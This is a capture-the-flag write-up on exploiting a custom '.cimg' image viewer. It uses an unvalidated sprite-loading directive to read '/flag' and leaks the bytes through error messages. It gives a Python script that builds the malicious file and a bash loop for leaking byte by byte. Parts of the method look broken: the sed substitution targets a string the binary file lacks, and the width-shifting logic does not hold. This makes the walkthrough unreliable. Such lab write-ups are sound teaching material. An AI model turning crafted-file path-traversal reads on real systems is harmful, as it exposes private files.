# **Write-Up: Exploiting the cimg Viewer Challenge**

## **Challenge Overview**
The challenge involves exploiting a vulnerability in a custom image viewer (`/challenge/cimg`) that processes `.cimg` files. The binary contains a vulnerability in `handle_5`, which loads sprite data from external files without proper validation. The goal is to read the contents of `/flag` by crafting a malicious `.cimg` file.

---

## **Key Vulnerabilities**
1. **`handle_5` Arbitrary File Read**  
   - The function reads a sprite file specified in the `.cimg` payload without path validation.
   - Allows directory traversal (e.g., `../../../../flag`) or direct file access (`/flag`).

2. **Character Validation Bypass**  
   - The program checks that sprite data consists of printable ASCII (`0x20-0x7F`).
   - If an invalid character is encountered, it prints an error with the hex value of the invalid byte (`ERROR: Invalid character 0xXX in the image data!`).

3. **Rendering Logic in `handle_4`**  
   - The `handle_4` function renders sprites to the framebuffer.
   - By controlling sprite dimensions and render size, we can leak flag bytes one at a time.

---

## **Exploit Strategy**
### **1. Load `/flag` as a Sprite**
- Use `handle_5` to load `/flag` as a sprite with dimensions `60x1` (since the flag is 61 bytes).
- Avoid reading the full 61 bytes at once to prevent null-termination issues.

### **2. Render Flag Bytes One by One**
- Use `handle_4` to render the sprite at `(0,0)` with size `1x1`.
- Each execution will display a single character from `/flag` (or an error if it's non-printable).
- By adjusting the sprite width and render position, we can leak the entire flag.

---

## **Final Exploit Code**
```python
import struct

FLAG_LENGTH = 61  # From `ls -la /flag`

def create_exploit_cimg():
    # Header - set canvas size to fit the flag
    header = (
        b'cIMG' +                   # Magic
        struct.pack('<H', 4) +      # Version
        struct.pack('BB', FLAG_LENGTH, 1) +  # Width=61, Height=1
        struct.pack('<I', 2)        # 2 directives
    )
    
    # Malicious handle_5 to load /flag as 60x1 sprite
    payload = (
        b'\x05\x00' +               # Directive 5
        b'\x00' +                   # Sprite ID 0
        struct.pack('BB', FLAG_LENGTH - 1, 1) +  # Width=60, Height=1
        b'/flag' +                  # Absolute path
        b'\x00' * (255 - 5)         # Padding
    )
    
    # handle_4 to render the sprite at (0,0) with size 1x1
    payload += (
        b'\x04\x00' +               # Directive 4
        b'\x00' +                   # Sprite ID 0
        b'\xFF\xFF\xFF' +           # White color
        b'\x00\x00' +               # Position (0,0)
        struct.pack('BB', 1, 1) +   # Render size 1x1
        b'\x20'                     # Transparency: space (0x20)
    )
    
    with open('flag.cimg', 'wb') as f:
        f.write(header + payload)

if __name__ == '__main__':
    create_exploit_cimg()
    print("Run: /challenge/cimg flag.cimg")
```

---

## **How the Exploit Works**
1. **`handle_5` Payload**  
   - Loads `/flag` as a `60x1` sprite (to avoid reading the full 61 bytes at once).
   - The binary reads `width × height` bytes (`60 × 1 = 60`), leaving the last byte unread.

2. **`handle_4` Payload**  
   - Renders the sprite at `(0,0)` with size `1x1`, displaying the first character.
   - If the character is invalid, the error message leaks its hex value.

3. **Leaking the Full Flag**  
   - Adjust the sprite width (e.g., `59`, `58`, etc.) to shift the read position.
   - Each run reveals a different byte of the flag.
   - Combine the outputs to reconstruct `/flag`.

---

## **Execution Steps**
1. **Generate the exploit file**:
   ```bash
   python3 exploit.py
   ```

2. **Run the exploit**:
   ```bash
   /challenge/cimg flag.cimg
   ```
   - If successful, it prints the first character of `/flag`.
   - If invalid, the error leaks the hex value (`0xXX`).

3. **Automate Leaking All Bytes**:
   ```bash
   for i in {60..1}; do
       sed -i "s/width=\x3C/width=\x$(printf '%02x' $i)/" flag.cimg
       /challenge/cimg flag.cimg 2>&1 | grep -oP '0x\K[0-9a-f]+' | xxd -r -p
   done | tr -d '\n'
   ```
   - Modifies the width in `flag.cimg` from `60` down to `1`.
   - Extracts leaked bytes from error messages.
   - Combines them into the final flag.

---

## **Key Takeaways**
1. **File Access Vulnerabilities**  
   - Always validate file paths in programs that read external files.
   - Directory traversal (`../../`) can lead to arbitrary file reads.

2. **Error Messages as Leaks**  
   - Error messages revealing hex values can be used to reconstruct data.

3. **Binary File Parsing Risks**  
   - Improper bounds checking can allow reading beyond intended limits.

4. **Automation for CTF Challenges**  
   - When leaking data byte-by-byte, script the process to avoid manual work.

---

## **Final Notes**
This challenge demonstrates how improper file handling in custom parsers can lead to arbitrary file reads. By carefully crafting a `.cimg` file and analyzing error messages, we extracted the flag despite character validation checks. 

**For future study**:
- Experiment with different sprite dimensions to understand memory layout.
- Try using `handle_3` (in-memory sprites) for alternative exploitation.
- Explore whether heap corruption is possible via malformed sprite data. 

Happy hacking! 🚩
